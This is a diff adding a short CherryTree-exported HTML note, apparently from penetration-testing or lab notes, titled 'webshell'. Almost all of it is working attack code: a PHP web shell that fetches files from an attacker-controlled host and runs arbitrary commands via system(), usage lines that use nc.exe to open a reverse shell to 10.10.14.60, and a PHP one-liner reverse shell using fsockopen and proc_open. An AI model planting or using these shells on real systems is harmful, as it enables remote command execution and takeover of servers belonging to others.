@@ -1,0 +1,8 @@
+<!doctype html><html>
+    <head>
+      <meta http-equiv="content-type" content="text/html; charset=utf-8">
+      <title>webshell</title>
+      <meta name="generator" content="CherryTree">
+      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+    </head>
+    <body><div class='page'><h1 class='title'>webshell</h1><br/><div class="codebox"><div class="codebox">#In&nbsp;script&nbsp;Webshell<br />$webshell&nbsp;=&nbsp;&lt;&lt;&lt;&#39;EOD&#39;<br />&lt;?php<br />&nbsp;if&nbsp;(isset($_REQUEST[&#39;fupload&#39;]))&nbsp;{<br />&nbsp;&nbsp;file_put_contents($_REQUEST[&#39;fupload&#39;],&nbsp;file_get_contents(&quot;http://10.10.14.60:8000/&quot;&nbsp;.&nbsp;$_REQUEST[&#39;fupload&#39;]));<br />&nbsp;};<br />&nbsp;if&nbsp;(isset($_REQUEST[&#39;fexec&#39;]))&nbsp;{<br />&nbsp;&nbsp;$cmd&nbsp;=&nbsp;($_REQUEST[&#39;fexec&#39;]);<br />&nbsp;&nbsp;echo&nbsp;system($cmd);<br />&nbsp;};<br />?&gt;<br />EOD;</div></div><br />useage:<br />10.10.10.9:80/yee.php?fupload=nc.exe        &lt;looking for something hosted on your webserver<br />     <br />10.10.10.9:80/yee.php?fexec=nc.exe 10.10.14.60 3232 -e cmd.exe<br /><br /><br /><br /><br /><br /><br /><br />&lt;?php $sock=fsockopen(&quot;10.10.14.3&quot;,3232);$proc=proc_open(&quot;/bin/sh -i&quot;, array(0=&gt;$sock, 1=&gt;$sock, 2=&gt;$sock),$pipes); ?&gt;</div></body></html>
